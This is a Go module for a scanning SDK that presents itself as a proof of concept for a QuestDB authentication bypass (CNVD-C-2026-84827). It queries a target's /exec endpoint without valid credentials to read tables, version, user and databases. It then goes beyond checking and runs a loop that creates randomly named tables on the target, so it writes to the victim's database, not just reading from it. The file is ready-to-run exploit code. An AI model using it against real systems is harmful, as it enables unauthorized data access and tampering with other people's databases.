package main

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"time"

	"santaizi/sdk"
)

type QuestDBModule struct {
	sdk.BaseModule
}

func (module *QuestDBModule) Info() sdk.ModuleConfig {
	return sdk.ModuleConfig{
		Name:        "QuestDB 认证绕过漏洞扫描器",
		Description: "QuestDB 认证绕过漏洞 POC, CNVD-C-2026-84827, CVE 申请中。作者：钟智强。该模块测试 QuestDB 的认证绕过漏洞，包括无凭证访问、错误凭证、畸形 Authorization 头测试，以及尝试读取敏感数据和获取数据库列表。",
		CNVD:        "CNVD-C-2026-84827",
		CVE:         "-",
		Options: []sdk.Option{
			{
				Name:     "host",
				Type:     "string",
				Required: false,
				Default:  "localhost",
			},
			{
				Name:     "loop",
				Type:     "int",
				Required: false,
				Default:  "1",
			},
			{
				Name:     "port",
				Type:     "int",
				Required: false,
				Default:  "9000",
			},
		},
	}
}

func (module *QuestDBModule) Init(options map[string]string) error {
	module.Config = options
	return nil
}

func (module *QuestDBModule) Run() (string, error) {
	host := module.GetOption("host")
	if host == "" {
		host = "localhost"
	}

	loopStr := module.GetOption("loop")
	loop := 1
	if loopStr != "" {
		fmt.Sscanf(loopStr, "%d", &loop)
	}

	portStr := module.GetOption("port")
	port := 9000
	if portStr != "" {
		fmt.Sscanf(portStr, "%d", &port)
	}

	target := fmt.Sprintf("%s:%d", host, port)
	baseURL := fmt.Sprintf("http://%s/exec", target)

	result := "[*] QuestDB Authentication Bypass POC\n"
	result += fmt.Sprintf("[*] 目标: %s\n\n", target)

	result += "[1] 测试无凭证访问...\n"
	response, err := http.Get(fmt.Sprintf("%s?query=show+tables", baseURL))
	if err != nil {
		result += fmt.Sprintf("错误: %v\n\n", err)
	} else {
		body, _ := io.ReadAll(response.Body)
		response.Body.Close()
		result += fmt.Sprintf("%s\n\n", string(body))
	}

	result += "[2] 测试错误凭证 (wrong:wrong)...\n"
	req, _ := http.NewRequest("GET", fmt.Sprintf("%s?query=select+count(*)+from+sys.tables", baseURL), nil)
	req.SetBasicAuth("wrong", "wrong")
	response, err = http.DefaultClient.Do(req)
	if err != nil {
		result += fmt.Sprintf("错误: %v\n\n", err)
	} else {
		body, _ := io.ReadAll(response.Body)
		response.Body.Close()
		result += fmt.Sprintf("%s\n\n", string(body))
	}

	result += "[3] 测试畸形Authorization头...\n"
	req, _ = http.NewRequest("GET", fmt.Sprintf("%s?query=select+version()", baseURL), nil)
	req.Header.Set("Authorization", "Basic invalid")
	response, err = http.DefaultClient.Do(req)
	if err != nil {
		result += fmt.Sprintf("错误: %v\n\n", err)
	} else {
		body, _ := io.ReadAll(response.Body)
		response.Body.Close()
		result += fmt.Sprintf("%s\n\n", string(body))
	}

	result += "[4] 尝试读取系统信息...\n"
	response, err = http.Get(fmt.Sprintf("%s?query=select+current_database(),current_user()", baseURL))
	if err != nil {
		result += fmt.Sprintf("错误: %v\n\n", err)
	} else {
		body, _ := io.ReadAll(response.Body)
		response.Body.Close()
		result += fmt.Sprintf("%s\n\n", string(body))
	}

	result += "[5] 获取数据库列表...\n"
	response, err = http.Get(fmt.Sprintf("%s?query=show+databases", baseURL))
	if err != nil {
		result += fmt.Sprintf("错误: %v\n\n", err)
	} else {
		body, _ := io.ReadAll(response.Body)
		response.Body.Close()
		result += fmt.Sprintf("%s\n\n", string(body))
	}

	result += "[*] POC 完成 - 如果看到查询结果，说明漏洞存在\n\n"

	injectTable := func(targetHost string) string {
		tableLength := rand.Intn(6) + 5
		tableName := fmt.Sprintf("tbl_%s", generateRandomString(tableLength))

		columnCount := rand.Intn(9) + 2
		var columnParts []string

		for i := 0; i < columnCount; i++ {
			columnName := generateRandomString(5)
			columnParts = append(columnParts, fmt.Sprintf("%s INT", columnName))
		}

		joinedColumns := strings.Join(columnParts, ",")
		query := fmt.Sprintf("CREATE TABLE %s (%s);", tableName, joinedColumns)

		var url string
		if strings.HasPrefix(targetHost, "http") {
			url = fmt.Sprintf("%s/exec", targetHost)
		} else {
			url = fmt.Sprintf("http://%s:%d/exec", targetHost, port)
		}

		requestURL := fmt.Sprintf("%s?query=%s", url, strings.ReplaceAll(query, " ", "%20"))
		response, err := http.Get(requestURL)
		statusCode := 0
		if err != nil {
			statusCode = -1
		} else {
			statusCode = response.StatusCode
			response.Body.Close()
		}

		return fmt.Sprintf("[%s] 正在注入表: %s | 状态码: %d", time.Now().Format("15:04:05"), tableName, statusCode)
	}

	result += fmt.Sprintf("正在对 %s 开始注入，共执行 %d 次...\n", host, loop)
	for i := 1; i <= loop; i++ {
		result += injectTable(host)
		result += "\n"
	}

	result += "任务完成。"

	return result, nil
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	seededRand := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func main() {
	module := &QuestDBModule{}
	sdk.RunModule(module)
}
